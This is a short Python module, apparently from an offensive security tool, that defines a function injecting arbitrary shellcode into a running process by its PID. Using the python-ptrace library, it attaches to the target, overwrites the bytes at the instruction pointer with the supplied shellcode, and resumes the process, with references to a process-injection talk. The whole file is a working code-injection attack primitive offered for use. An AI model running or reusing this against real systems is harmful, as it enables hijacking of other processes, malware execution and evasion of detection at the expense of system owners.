"""
https://github.com/XiphosResearch/steelcon-python-injection
http://www.xiphosresearch.com/2014/08/07/Process-Injection.html

https://python-ptrace.readthedocs.org/en/latest/
python-ptrace is a debugger using ptrace (Linux, BSD and Darwin system call to trace processes) written in Python.
"""


def injectmex64(pid, shellcode):
    from sys import platform

    if platform.startswith('win'):
        print ("\nPtrace not working on windows machines ..\n")
        return False
    else:
        try:
            from ptrace.debugger.debugger import PtraceDebugger
            from ptrace.debugger.debugger import PtraceProcess
        except ImportError: 
            print ("\nYou must install ptrace library before use this script.\n")
            return False
        else:
            try:
                dbg = PtraceDebugger()
                process = dbg.addProcess(int(pid), False)
                rip = process.getInstrPointer()
                bytes = process.writeBytes(rip, shellcode.replace("\\x", "").decode("hex"))
                process.setreg("rbx", 0)
                process.cont()
            except Exception as error:
                print (error)
                print ("\nPlease do not forget report !\n")
            else:
                print ("\nInject complate !\n")

